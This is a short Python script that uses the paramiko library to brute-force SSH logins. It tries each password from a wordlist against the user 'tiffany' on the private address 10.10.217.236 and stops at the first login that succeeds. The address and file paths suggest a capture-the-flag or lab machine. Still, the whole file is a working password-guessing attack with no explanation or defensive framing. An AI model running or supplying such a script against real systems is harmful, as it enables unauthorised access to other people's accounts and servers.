import paramiko

f = open('/root/wordlist2.txt', 'r')

wordlist = list(f.read().split ('\n'))

host = '10.10.217.236'
username2 = 'tiffany'

for i in wordlist:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22,username=username2,password=i)
        print("login successful {} and {}".format(username2,i))
        break
    except:
        pass

f.close()
